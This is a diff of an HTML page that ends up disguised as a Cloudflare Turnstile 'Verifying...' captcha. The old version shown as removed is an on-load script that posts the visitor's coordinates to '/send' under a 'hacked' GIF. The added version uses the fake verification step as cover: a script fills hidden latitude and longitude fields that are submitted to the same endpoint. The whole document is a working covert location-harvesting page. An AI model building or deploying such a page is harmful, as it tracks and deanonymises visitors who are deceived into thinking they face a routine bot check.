@@ -1,19 +1,26 @@
+<!DOCTYPE html>
 <html>
-<body onload="getLocation()">
-<script>
-navigator.geolocation.getCurrentPosition(function(location) {
-  fetch('/send', {
-    method: 'POST',
-    headers: {
-      'Content-Type': 'application/json'
-    },
-    body: JSON.stringify({
-      lat: location.coords.latitude,
-      lon: location.coords.longitude
-    })
-  });
-});
-</script>
-  <iframe src="https://giphy.com/embed/MBIcJIaE8SLY6jKrqp" width="480" height="270" frameBorder="0" class="giphy-embed" allowFullScreen></iframe><p><a href="https://giphy.com/gifs/oh-no-shit-hacked-MBIcJIaE8SLY6jKrqp">via GIPHY</a></p>
+<head>
+  <title>Verifying...</title>
+  <script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
+</head>
+<body>
+  <form id="captcha-form" method="POST" action="/send">
+    <input type="hidden" name="lat" id="lat">
+    <input type="hidden" name="lon" id="lon">
+
+    <div class="cf-turnstile"
+         data-sitekey="0x4AAAAAABjnlaRimxoraDQR">
+    </div>
+
+    <button type="submit">Verify</button>
+  </form>
+
+  <script>
+    navigator.geolocation.getCurrentPosition(function(location) {
+      document.getElementById('lat').value = location.coords.latitude;
+      document.getElementById('lon').value = location.coords.longitude;
+    });
+  </script>
 </body>
 </html>
